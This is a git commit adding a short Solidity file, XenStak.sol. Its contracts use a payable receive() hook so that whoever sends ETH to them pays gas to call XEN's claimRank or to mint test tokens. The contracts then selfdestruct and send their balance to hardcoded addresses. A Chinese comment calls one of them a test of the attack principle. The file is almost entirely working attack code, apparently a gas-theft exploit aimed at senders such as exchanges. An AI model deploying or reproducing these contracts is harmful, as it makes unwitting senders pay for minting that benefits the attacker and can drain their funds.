69904b090ed726e5317a9ae319b49d71697b4c92
hanguang254 <725204548@qq.com>
2022-10-14 14:20:24 +0800

    Solidity

---
+++ XenStak.sol
@@ -0,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+//xen接口
+interface IRankedMintingToken {
+    event RankClaimed(address indexed user, uint256 term, uint256 rank);
+
+    event MintClaimed(address indexed user, uint256 rewardAmount);
+
+    function claimRank(uint256 term) external;
+
+    function claimMintReward() external;
+}
+
+contract recevieDemo{
+    //xen 合约地址
+    address public _addr = 0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8 ;
+    //质押天数
+    uint256 public term = 1;
+    
+    receive() payable external{
+        //xen mint接口
+        IRankedMintingToken(_addr).claimRank(term);
+        //合约里有余额就转入以下地址
+        selfdestruct(payable(0x6971b57a29764eD7af4A4a1ED7a512Dde9369Ef6));
+
+    }
+}
+
+
+
+
+//测试 erc20 代币
+contract Mytoken is ERC20{
+    constructor() ERC20("Mytoken","XTN"){}
+    function formint(address to ,uint256 amount) public{
+        _mint(to,amount);
+    }
+}
+//Mytoken的接口
+interface test{
+    function formint(address to,uint256 amount) external;
+}
+//测试攻击原理
+contract testDemo{
+    receive() payable external{
+        //测试原理
+        // 合约地址：0xcF20F78278fA86ce8762aFfABd173F1254605A4c
+        test(0xcF20F78278fA86ce8762aFfABd173F1254605A4c).formint(address(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8),10000000000000);
+        selfdestruct(payable(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8));
+    }
+}
